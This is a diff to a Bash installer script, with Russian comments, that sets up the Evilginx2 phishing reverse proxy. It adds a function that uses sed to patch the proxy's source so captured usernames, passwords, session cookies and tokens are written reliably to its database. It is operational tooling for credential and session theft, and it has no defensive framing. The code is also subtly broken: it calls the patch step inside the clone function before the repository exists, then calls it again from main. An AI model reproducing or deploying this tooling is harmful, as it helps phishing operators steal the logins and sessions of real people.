@@ -113,6 +113,7 @@ remove_existing() {
 
 # Клонирование репозитория
 clone_repository() {
+    apply_database_patch
     log "Клонирование Evilginx2 в /root/evilginx2..."
     git clone https://github.com/kgretzky/evilginx2.git /root/evilginx2
     
@@ -123,6 +124,55 @@ clone_repository() {
     success "Репозиторий успешно склонирован"
 }
 
+# Применение патча для сохранения сессий в базу данных
+apply_database_patch() {
+    log "Применение патча для исправления сохранения сессий в базе данных..."
+    
+    cd /root/evilginx2
+    
+    # Определить директорию скрипта
+    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+    
+    # Проверить наличие патча
+    if [[ -f "$SCRIPT_DIR/evilginx2_database_fix.patch" ]]; then
+        log "Найден патч базы данных, применяем..."
+        
+        # Создать резервную копию
+        cp core/http_proxy.go core/http_proxy.go.orig
+        
+        # Применить патч
+        if patch -p1 < "$SCRIPT_DIR/evilginx2_database_fix.patch"; then
+            success "Патч базы данных применен успешно"
+        else
+            warning "Патч применился частично, добавляем недостающие исправления вручную..."
+            # Добавить db.Flush() вручную в ключевых местах
+            sed -i "/CreateSession.*err.*log.Error/a\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
+            sed -i "/SetSessionUsername.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
+            sed -i "/SetSessionPassword.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
+            sed -i "/SetSessionCookieTokens.*err.*log.Error/a\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
+            sed -i "/SetSessionHttpTokens.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
+        fi
+    else
+        warning "Файл патча не найден, применяем базовые исправления..."
+        # Создать резервную копию
+        cp core/http_proxy.go core/http_proxy.go.orig
+        # Добавить db.Flush() в ключевых местах для сохранения сессий
+        sed -i "/CreateSession.*err.*log.Error/a\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
+        sed -i "/SetSessionUsername.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
+        sed -i "/SetSessionPassword.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
+        sed -i "/SetSessionCookieTokens.*err.*log.Error/a\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
+        sed -i "/SetSessionHttpTokens.*err.*log.Error/a\\t\\t\\t\\t\\t\\tp.db.Flush()" core/http_proxy.go
+    fi
+    
+    # Проверить что исправления применились
+    flush_count=$(grep -c "db\.Flush()" core/http_proxy.go || echo "0")
+    if [[ "$flush_count" -gt 0 ]]; then
+        success "Добавлено $flush_count вызовов db.Flush() для надежного сохранения сессий"
+    else
+        warning "Не удалось автоматически применить исправления. Используется оригинальная версия."
+        cp core/http_proxy.go.orig core/http_proxy.go
+    fi
+}
 # Компиляция Evilginx2
 compile_evilginx() {
     log "Компиляция Evilginx2..."
@@ -344,6 +394,7 @@ main() {
     check_go_version
     remove_existing
     clone_repository
+    apply_database_patch
     compile_evilginx
     install_binary
     create_directories
